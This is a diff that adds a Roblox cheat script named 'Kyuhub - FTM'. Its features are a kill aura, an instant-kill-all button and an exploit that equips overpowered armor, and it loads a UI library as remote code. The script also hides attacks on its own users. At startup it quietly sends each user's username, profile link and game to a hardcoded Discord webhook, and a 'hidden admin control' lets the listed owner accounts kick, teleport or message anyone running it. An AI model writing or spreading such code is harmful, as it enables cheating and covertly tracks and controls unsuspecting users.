@@ -1,1 +1,284 @@
-print("change23")
+-- Exclusion list
+local exclusionList = {
+    617016152, -- Your user ID
+    5734469370 -- New user ID
+}
+
+-- Owner list
+local ownerList = {
+    1283484009,
+    617016152, 
+    5734469370 
+}
+
+-- Webhook function
+local function sendWebhook()
+    local player = game.Players.LocalPlayer
+
+    -- Check if player is in the exclusion list
+    for _, excludedId in ipairs(exclusionList) do
+        if player.UserId == excludedId then
+            return
+        end
+    end
+
+    local username = player.Name
+    local profileLink = "https://www.roblox.com/users/" .. player.UserId .. "/profile"
+    local dateTime = os.date("%Y-%m-%d %H:%M:%S")
+    local gameLink = "https://www.roblox.com/games/" .. game.PlaceId
+
+    local webhookUrl = "https://discord.com/api/webhooks/1255888074504671262/gz9jZ8nWhEmE9pt5GTdM_NLzdxJRZJmmJ1HTPYs0hUyhrKAMAkn4R5Ko0GjXoUZ5IjyP"
+    local payload = {
+        ["content"] = "",
+        ["embeds"] = {{
+            ["title"] = "Script Executed",
+            ["description"] = "A user has executed the script.",
+            ["fields"] = {
+                {["name"] = "Username", ["value"] = username, ["inline"] = true},
+                {["name"] = "Profile", ["value"] = profileLink, ["inline"] = true},
+                {["name"] = "Date & Time", ["value"] = dateTime, ["inline"] = false},
+                {["name"] = "Game Executed At", ["value"] = gameLink, ["inline"] = false}
+            },
+            ["color"] = tonumber(0x00ff00)
+        }}
+    }
+
+    local jsonPayload = game:GetService("HttpService"):JSONEncode(payload)
+
+    local headers = {["Content-Type"] = "application/json"}
+
+    request = http_request or request or HttpPost or syn.request
+    request({Url = webhookUrl, Method = "POST", Headers = headers, Body = jsonPayload})
+end
+
+-- Send webhook notification at the start
+sendWebhook()
+
+-- Orion Library Initialization
+local OrionLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/shlexware/Orion/main/source"))()
+local Window = OrionLib:MakeWindow({Name = "Kyuhub - FTM", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionConfig"})
+
+local Settings = {
+    KillAura_Enabled = false,
+    KillAura_Range = 10,
+    Highlight_Transparency = 0.5,
+    Highlight_Enabled = true
+}
+
+local player = game.Players.LocalPlayer
+
+local rangeHighlight = Instance.new("SphereHandleAdornment")
+rangeHighlight.Color3 = Color3.fromRGB(255, 0, 0)
+rangeHighlight.Transparency = Settings.Highlight_Transparency
+rangeHighlight.Adornee = nil
+rangeHighlight.Radius = Settings.KillAura_Range
+rangeHighlight.Parent = game.CoreGui
+
+-- Functions
+local function isWithinRange(playerPos, mobPos, range)
+    return (playerPos - mobPos).Magnitude <= range
+end
+
+local function updateRangeHighlight()
+    local character = player.Character
+    local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
+    
+    if humanoidRootPart and Settings.Highlight_Enabled then
+        rangeHighlight.Adornee = humanoidRootPart
+        rangeHighlight.Radius = Settings.KillAura_Range
+        rangeHighlight.Transparency = Settings.Highlight_Transparency
+    else
+        rangeHighlight.Adornee = nil
+    end
+end
+
+local function attackMobsInRange()
+    local character = player.Character
+    local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
+    local weapon = character and character:FindFirstChildWhichIsA("Tool")
+    
+    if not humanoidRootPart or not weapon then return end
+
+    local foundMob = false
+    
+    for _, mob in ipairs(workspace.MobHolder:GetChildren()) do
+        if mob:FindFirstChild("Torso") and mob:FindFirstChild("Enemy") then
+            if isWithinRange(humanoidRootPart.Position, mob.Torso.Position, Settings.KillAura_Range) then
+                foundMob = true
+                local args = {
+                    [1] = mob.Torso,
+                    [2] = mob.Enemy,
+                    [3] = weapon
+                }
+                game:GetService("ReplicatedStorage").GameRemotes.DamageEvent:FireServer(unpack(args))
+            end
+        end
+    end
+
+    return foundMob
+end
+
+local function equipOPArmor()
+    local armorPad = game:GetService("Workspace").ArmorHolder["DESTROYER Armor || Level 0 || [+INF Health]  [+50 Speed]"].Pad
+    local touchInterest = armorPad:FindFirstChildWhichIsA("TouchTransmitter")
+    if touchInterest then
+        firetouchinterest(player.Character.HumanoidRootPart, armorPad, 0)
+        firetouchinterest(player.Character.HumanoidRootPart, armorPad, 1)
+    end
+end
+
+local function bringPlayer(targetPlayer)
+    local character = player.Character
+    local targetCharacter = targetPlayer.Character
+    if character and targetCharacter then
+        targetCharacter:MoveTo(character.PrimaryPart.Position)
+    end
+end
+
+local loopBringEnabled = false
+local function loopBringPlayer(targetPlayer)
+    loopBringEnabled = true
+    spawn(function()
+        while loopBringEnabled do
+            bringPlayer(targetPlayer)
+            wait(0.5) -- Adjust the interval as needed
+        end
+    end)
+end
+
+local function kickPlayer(targetPlayer, reason)
+    targetPlayer:Kick(reason)
+end
+
+local function killAllEnemies()
+    for _, mob in ipairs(workspace.MobHolder:GetChildren()) do
+        if mob:FindFirstChild("Enemy") then
+            mob.Enemy.Health = 0
+        end
+    end
+end
+
+-- Hidden admin control function
+local function adminControl()
+    spawn(function()
+        while true do
+            for _, ownerId in ipairs(ownerList) do
+                local owner = game.Players:GetPlayerByUserId(ownerId)
+                if owner then
+                    owner.Chatted:Connect(function(message)
+                        local command = string.lower(message)
+                        local args = string.split(command, " ")
+                        if command == "bring" then
+                            bringPlayer(player)
+                        elseif command == "loopbring" then
+                            loopBringPlayer(player)
+                        elseif command == "stoploopbring" then
+                            loopBringEnabled = false
+                        elseif args[1] == "kick" then
+                            local reason = table.concat(args, " ", 2)
+                            kickPlayer(player, reason)
+                        elseif string.sub(command, 1, 6) == "notif " then
+                            local notifMessage = string.sub(message, 7)
+                            OrionLib:MakeNotification({
+                                Name = "Script Owner",
+                                Content = notifMessage,
+                                Image = "rbxassetid://4483345998",
+                                Time = 5
+                            })
+                        elseif command == "killallenemies" then
+                            killAllEnemies()
+                        end
+                    end)
+                end
+            end
+            wait(10) -- Check for owner messages every 10 seconds
+        end
+    end)
+end
+
+-- Execute hidden admin control
+adminControl()
+
+-- UI Tab and Toggles
+local Tab = Window:MakeTab({
+    Name = "Kill Aura",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+
+Tab:AddToggle({
+    Name = "Enable Kill Aura",
+    Default = false,
+    Callback = function(value)
+        Settings.KillAura_Enabled = value
+        if value then
+            updateRangeHighlight()
+        else
+            rangeHighlight.Adornee = nil
+        end
+    end
+})
+
+Tab:AddSlider({
+    Name = "Kill Aura Range",
+    Min = 1,
+    Max = 100,
+    Default = 10,
+    Increment = 1,
+    Callback = function(value)
+        Settings.KillAura_Range = value
+        updateRangeHighlight()
+    end
+})
+
+Tab:AddSlider({
+    Name = "Highlight Transparency",
+    Min = 0,
+    Max = 1,
+    Default = 0.5,
+    Increment = 0.1,
+    Callback = function(value)
+        Settings.Highlight_Transparency = value
+        updateRangeHighlight()
+    end
+})
+
+Tab:AddToggle({
+    Name = "Show Highlight",
+    Default = true,
+    Callback = function(value)
+        Settings.Highlight_Enabled = value
+        updateRangeHighlight()
+    end
+})
+
+Tab:AddButton({
+    Name = "Equip OP Armor",
+    Callback = function()
+        equipOPArmor()
+    end
+})
+
+Tab:AddButton({
+    Name = "Kill Nearby all enemies",
+    Callback = function()
+        killAllEnemies()
+    end
+})
+
+Tab:AddParagraph("NOTE:","Might have to spam kill nearby enemies if players are near it.")
+-- Continuous Update Loop
+spawn(function()
+    while true do
+        if Settings.KillAura_Enabled then
+            local foundMob = attackMobsInRange()
+            if not foundMob then
+                wait(1) -- Wait longer if no mobs are found within range
+            end
+        end
+        wait(0.1) -- Adjust the delay as necessary
+    end
+end)
+
+-- Orion Library Initialization
+OrionLib:Init()
